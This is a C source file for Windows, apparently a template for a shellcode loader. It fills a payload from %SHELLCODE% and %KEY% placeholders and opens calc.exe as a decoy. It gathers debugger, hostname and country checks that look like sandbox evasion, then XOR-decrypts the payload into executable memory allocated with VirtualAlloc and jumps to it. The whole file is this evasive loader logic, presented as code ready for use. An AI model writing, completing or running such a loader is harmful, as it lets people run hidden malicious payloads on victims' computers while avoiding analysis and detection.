#include <windows.h>
#include "config.h"
#include <stdio.h>

__attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
    int is_debugged = d();
    int size = z();
    char *hostname = h();
    char *country = c();

    char k[] = "%KEY%";
    size_t k_len = strlen(k);
    size_t ss = sizeof(msgbox_payload)-1;
    
    printf("is_debugged: %d\n", is_debugged);
    printf("hostname: %s\n", hostname);
    printf("size: %d\n", size);
    printf("country: %s\n", country);

    printf("Key: %s\n", k);
    printf("Key size: %zu\n", k_len);
    printf("Shellcode size: %zu\n", ss);

    // Allocating executable memory
    void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
        return;
    }

    // Copy shellcode into allocated memory
    memcpy(exec_mem, msgbox_payload, ss);

    if (k_len != 0) {
        for (size_t i = 0; i < ss; ++i) {
            ((unsigned char*)exec_mem)[i] ^= k[i % k_len];
        }
    }

    // jump on it
    ((void (*)())exec_mem)();

    ((void (*)())exec_mem)();
}

